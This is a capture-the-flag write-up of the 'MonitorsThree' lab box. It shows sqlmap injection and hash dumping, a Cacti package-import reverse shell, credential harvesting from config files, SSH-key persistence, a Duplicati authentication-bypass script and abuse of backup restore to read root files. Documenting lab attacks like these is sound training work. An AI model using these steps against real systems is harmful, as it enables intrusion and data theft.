+++
date = '2026-08-23T00:50:50+02:00'
draft = false
title = 'MonitorsThree Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`21/08/2026`**

![pwn.png](/images/imgs_monitors3/pwn.png)

---
# Introduction

**_MonitorsThree_** is a **Medium-level Linux** box that focuses on thorough web enumeration, custom application exploitation, and local service abuse.

The initial foothold requires discovering a hidden **virtual host** and leveraging an **SQL Injection** in a custom **forgot-password** feature to dump credentials. After cracking the hashes, we gain access to a **Cacti** instance and exploit a recent **Authenticated RCE** to get a shell.

Lateral movement involves enumerating the **Cacti** database to retrieve and crack another user's hash. Finally, for Privilege Escalation, we discover an internal **Duplicati** service. By stealing its local **SQLite** database, we can **bypass the authentication** mechanism and abuse the **backup restore** functionality to **read arbitrary files** from the filesystem, ultimately leading to the **root flag**.

---
# Techniques Used

- **Virtual Host Enumeration**

- **Error-Based SQL Injection**

- **Hash Cracking**

- **Cacti Authenticated RCE (CVE-2024-25641)**

- **Internal Port Forwarding** 

- **Duplicati Authentication Bypass**

- **Abusing Backup Restore for Privilege Escalation**

---
# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- monitors3
```

```text
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
8084/tcp filtered websnp
```

Targeted scan with scripts and version detection:

```bash
nmap -sC -sV monitors3
```

```text
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: MonitorsThree - Networking Solutions
|_http-server-header: nginx/1.18.0 (Ubuntu)
8084/tcp filtered websnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open ports**:

- **22**/tcp - SSH

- **80**/tcp - HTTP

- **8084**/tcp - websnp (filtered)

## Web Enumeration

Visiting the webpage on port 80, I could see two interesting things:

**`1.`** An exposed email referencing the domain **`monitorsthree.htb`**, which I added to my **`/etc/hosts`** file.

![web2.png](/images/imgs_monitors3/web2.png)

**`2.`** A custom login page.

![web1.png](/images/imgs_monitors3/web1.png)

Since I wasn't able to reach the **websnp** service on port **`8084`**, I started testing the login page. It was not a known **CMS** or platform, so I simply intercepted a login request with **Burp Suite**, saved it to a file **`req.req`**, and replaced the username and password parameters with **`*`**.

![login_req.png](/images/imgs_monitors3/login_req.png)

I fed it to **sqlmap** to check for **SQL injections**:

```bash
sqlmap -r req.req --level 5 --risk 3 --dbs
```

The attack was taking a lot of time, so in the background, I ran a fast directory scan using **Gobuster**:

```bash
gobuster dir -u http://monitors3 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Nothing immediately useful came up, except for an **`/admin`** entry that returned a **403 Forbidden**.

I moved on to enumerate virtual hosts using **ffuf**:

```bash
ffuf -u http://monitorsthree.htb -H 'HOST: FUZZ.monitorsthree.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 13560
```

![ffuf.png](/images/imgs_monitors3/ffuf.png)

I got a hit with the subdomain **`cacti`**. I added **`cacti.monitorsthree.htb`** to my **`/etc/hosts`** file and browsed to it.
A **Cacti** login instance was hosted there, and the version was visible: **`1.2.26`**.

![cacti.png](/images/imgs_monitors3/cacti.png)

I searched for known vulnerabilities:

```bash
searchsploit cacti 1.2.26
```

![scsploit.png](/images/imgs_monitors3/scsploit.png)

It revealed an **Authenticated RCE**. I also searched online but found little on unauthenticated exploits. Since I didn't have any credentials, I had to go back to the **SQL injection** attack.

---
# Initial Access | SQLi to Cacti RCE

**sqlmap** didn't find anything on the main login form, and manual payloads failed as well. However, there was the **`forgot_password.php`** page.
I tested it manually with simple payloads, and got an **SQL Error** with **`'`**. **The injection was there**.

![sql_error.png](/images/imgs_monitors3/sql_error.png)

I intercepted the password reset request

![reset_req.png](/images/imgs_monitors3/reset_req.png)

saved it as **`req.req`**, and fired up **sqlmap** again:

```bash
sqlmap -r req.req --level 5 --risk 3 --dbs
```

![sql1.png](/images/imgs_monitors3/sql1.png)

This time, it successfully retrieved the databases, including **`monitorsthree_db`**. I proceeded to enumerate the tables:

```bash
sqlmap -r req.req --level 5 --risk 3 -D monitorsthree_db --tables
```

![sql2.png](/images/imgs_monitors3/sql2.png)

I found a **`users`** table and dumped its contents:

```bash
sqlmap -r req.req --level 5 --risk 3 -D monitorsthree_db -T users --dump
```

![sql3.png](/images/imgs_monitors3/sql3.png)

The dump revealed 4 hashes:

```text
admin:31a181c8372e3afc59dab863430610e8
mwatson:c585d01f2eb3e6e1073e92023088a3dd
janderson:1e68b6eb86b45f6d92f8f292428f77ac
dthompson:633b683cc128fe244b00f176c8a950f5
```

I successfully cracked the **admin** hash 

![cracked.png](/images/imgs_monitors3/cracked.png)

and logged into the **Cacti** platform.

![cacti_logged.png](/images/imgs_monitors3/cacti_logged.png)

Now, I remembered the **CVE** found earlier. I searched online for a better understanding of the exploit and found the **GitHub** advisory:

- **https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88**

**Note**: _This specific vulnerability (**GHSA-7cmj-g5qc-pj88**) allows an authenticated user to achieve **Remote Code Execution** (**RCE**) by abusing the **Package Import** feature. The application does not properly sanitize the imported data, meaning an attacker can craft a malicious package, inject a **PHP** payload into fields like **`filedate`**, and execute it by navigating to the newly created resource._

To manually exploit this:

**`1.`** I copied the script from the **GitHub** page.

**`2.`** I inserted **PHP** code for a reverse shell into the **`filedate`** field and generated the malicious archive (**`mal.php`**).

![mal.png](/images/imgs_monitors3/mal.png)

**`3.`** Inside **Cacti**, I navigated to **`Import/Export --> Import Package`**, selected the generated archive, and imported it.

![inti1.png](/images/imgs_monitors3/init1.png)

**`4.`** I set up a **netcat** listener and requested the payload: [http://cacti.monitorsthree.htb/cacti/resource/test.php](http://cacti.monitorsthree.htb/cacti/resource/test.php).

I successfully received a shell back as **`www-data`**.

![initial.png](/images/imgs_monitors3/initial.png)

---
# Lateral Movement | Database Enum to Marcus

After upgrading my shell, I followed my usual methodology for **Cacti** (similar to what I've done on **_Monitors_** and **_MonitorsTwo_**) and targeted the database configuration file.

```bash
cat /var/www/html/cacti/include/config.php
```

![conf.png](/images/imgs_monitors3/conf.png)

I extracted the database credentials and connected to **MySQL**:

```bash
mysql -D cacti -u cactiuser -p 
```

I checked the **`user_auth`** table to dump the application hashes:

```SQL
show databases;
use cacti;
show tables;
select * from user_auth\G;
```

![cacti_db.png](/images/imgs_monitors3/cacti_db.png)

I found a hash for the user **`marcus`**. Since he was the main user in the previous boxes of the saga, I knew cracking his hash was the right path.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![john.png](/images/imgs_monitors3/john.png)

The hash cracked successfully. I tried connecting through **SSH**, but password authentication was disabled:

![ssh_fail.png](/images/imgs_monitors3/ssh_fail.png)

So, I simply switched user from my existing **`www-data`** shell:

```bash
su marcus
```

I retrieved the user flag in his home directory:

```bash
cat /home/marcus/user.txt
```

![userf.png](/images/imgs_monitors3/userf.png)

For persistent access, I added my public **RSA key** into **`/home/marcus/.ssh/authorized_keys`** and connected smoothly through **SSH**.

![persistance.png](/images/imgs_monitors3/persistance.png)

---
# Privilege Escalation | Duplicati Exploit

I started the internal manual enumeration to look for hidden services:

```bash
ss -tuln
```

![sstuln.png](/images/imgs_monitors3/sstuln.png)

This revealed an internal service listening on port **`8200`**. Since I had **SSH** access, I created a tunnel:

```bash
ssh -L 8200:127.0.0.1:8200 marcus@monitorsthree.htb -i id_rsa
```

![tunnel.png](/images/imgs_monitors3/tunnel.png)

Browsing to **`localhost:8200`**, I found a **Duplicati** login form. I wasn't very familiar with it, so I did some fast research.

**Note**: _Duplicati is a free, open-source backup client that securely stores encrypted, incremental backups on remote or local storage. It operates via a local web-based interface, which is why it was listening on internal port **`8200`**. Since it manages system backups, it typically requires broad file access permissions, making it a prime target for Privilege Escalation._

Initially, I searched for configuration files hoping to find a plaintext password:

```bash
locate duplicati
ls -lha /opt/duplicati/config
```

I saw a **`Duplicati-server.sqlite`** database file. Since **sqlite3** was not installed on the box, I downloaded it to my **Kali** machine, using **netcat**, to inspect it locally.
I connected to the **DB** but wasn't sure what to look for. Searching online for vulnerabilities, I found an **authentication bypass** vulnerability:

- **https://github.com/duplicati/duplicati/issues/5197**

To exploit this, I needed the **`Server_passphrase`**. I found it stored in the **`Option`** table of the **SQLite** database:

```bash
sqlite3 Duplicati-server.sqlite
sqlite> .tables;
sqlite> select * from Option;
```

![sqlite.png](/images/imgs_monitors3/sqlite.png)

After retrieving the passphrase, I followed the **GitHub** guide. I intercepted the login response after sending a random password, which returned a **Nonce** and a **Salt**:

![salt.png](/images/imgs_monitors3/salt.png)

I converted the **`Server_passphrase`** from **base64** to **hex**:

```bash
echo 'Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=' | base64 -d | xxd -p
```

Then, I crafted the **bypass payload** using the browser console:

```JavaScript
var saltedpwd = '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a'; // Hex output
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('uMINN1xt0j17kxIJSAMv7Ev+zjFEumbD0AxF7pHpt6M=') + saltedpwd)).toString(CryptoJS.enc.Base64); // Replaced Nonce from Burp
console.log(noncedpwd);
```

![console.png](/images/imgs_monitors3/console.png)

I copied the returned value, forwarded the request in **Burp Suite**, pasted the value into the password parameter (**URL-encoded**), and successfully bypassed the authentication.

![dupli_bypass.png](/images/imgs_monitors3/dupli_bypass.png)

Since there were no specific PrivEsc exploits for this version, I decided to abuse the core functionality: **Restoring Backups**.

I started interacting with the "**Add Backup**" function:

- I set **Encryption** to **No Encryption**

![privesc1.png](/images/imgs_monitors3/privesc1.png)

For the "**backup destination**", I noticed that the **`/source`** directory exposed what looked like the host's filesystem (containing **`marcus`**'s home, etc.). This meant **`/Computer`** was probably the container/app filesystem.

- I selected an accessible directory for the destination: **`/source/home/marcus/`**.

![privesc2.png](/images/imgs_monitors3/privesc2.png)

- For "**Source Data**", I selected **`/Computer/source/root/`** to backup the host's root folder.

![privesc3.png](/images/imgs_monitors3/privesc3.png)

I unchecked "**Automatically run backups**" to avoid time/date errors and saved it.

![privesc4.png](/images/imgs_monitors3/privesc4.png)

I clicked **Run now**.

![privesc5.png](/images/imgs_monitors3/privesc5.png)

Once the backup finished, I went to **Restore files**. 

![privesc6.png](/images/imgs_monitors3/privesc6.png)

I initially looked for an **SSH key** but didn't find one, so I just selected the **`root.txt`** file.
I chose **`/source/home/marcus/`** as the restore folder path and hit the **restore** button.

Checking **`marcus`**'s home directory from my **SSH** shell, I found the restored file and was able to read the **root flag**.

![rootf.png](/images/imgs_monitors3/rootf.png)

---
# Final Thoughts

This was a great continuation of the saga. Compared to **_Monitors_**, this box definitely sits comfortably in the **Medium** difficulty tier.
The steps were logical and the initial access required some solid manual web enumeration and a good eye for identifying custom **SQL injections**. The Privilege Escalation phase was very interesting—having to exfiltrate an **SQLite** database to **bypass authentication** and then leveraging the application's intended backup mechanics to read the host's filesystem was a really clever chain.

**Sources**:

- **Cacti RCE (GHSA-7cmj-g5qc-pj88) | https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88**

- **Duplicati Auth Bypass (#5197) | https://github.com/duplicati/duplicati/issues/5197**